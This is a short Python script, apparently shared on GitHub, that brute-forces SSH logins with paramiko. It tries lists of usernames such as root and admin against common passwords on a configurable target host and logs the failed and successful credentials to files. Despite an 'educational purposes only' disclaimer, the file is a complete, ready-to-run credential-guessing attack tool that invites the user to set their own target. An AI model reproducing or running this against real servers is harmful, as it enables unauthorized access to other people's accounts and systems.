import paramiko

# This program is a simple brute force attack on a SSH server.
# It will try to connect to the server using a list of users and passwords.
# It's a simple program and it's not very efficient, but it's a good example of how a brute force attack works.
# Don't use this program to attack any server, it's illegal and unethical. This program is for educational purposes only.
#
# Made by Stunkz on Github ( https://github.com/Stunkz )
#

# MODIFY THESE VARIABLES TO MATCH TO YOUR NEEDS.


HOST = '127.0.0.1' # The IP address of the server you want to attack

USERS_LIST = ['root', 'admin', 'user', 'test', 'cia'] # The list of users you want to try. Can be a link to a file. ( e.g. 'users.txt')
PASSWORDS_LIST = ['test', 'password', '123456', 'top_secret_chhh...'] # Same. Can be a link to a file. ( e.g. 'passwords.txt')

CONTINUE_ON_SUCCESS = False # If True, the program will continue to try to connect to the server even if it found the right user/password combination.

SAVE_FAIL = True # If True, the program will save the results in a file.
SAVE_FAIL_FILE = 'log.txt' # The name of the file where the program will save the failed attempts. it can be a path. ( e.g. 'logs/log.txt')
SAVE_SUCCESS = False # If True, the program will save the successful attempts in a file.
SAVE_SUCCESS_FILE = 'success.txt' # Same. ( e.g. 'logs/success.txt')

def try_connect(user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=HOST, username=user, password=password)
        return True
    except:
        return False

def main():

    for user in USERS_LIST:
        for password in PASSWORDS_LIST:

            print(f'Trying user: \033[33m{user}\033[00m with password: \033[33m{password}\033[00m')

            if try_connect(user, password):

                print(f'\033[33mUser: \033[91m{user}\033[33m Password: \033[91m{password}\033[33m worked\033[00m')

                if SAVE_SUCCESS:
                    with open(SAVE_SUCCESS_FILE, 'a') as f:
                        f.write(f'User: {user} Password: {password}\n')

                if CONTINUE_ON_SUCCESS:
                    continue
                return

            if SAVE_FAIL:
                with open(SAVE_FAIL_FILE, 'a') as f:
                    f.write(f'User: {user} Password: {password} Failed\n')

if __name__ == '__main__':
    if type(USERS_LIST) == str:
        with open(USERS_LIST, 'r') as f:
            USERS_LIST = f.read().splitlines()
    if type(PASSWORDS_LIST) == str:
        with open(PASSWORDS_LIST, 'r') as f:
            PASSWORDS_LIST = f.read().splitlines()
    main()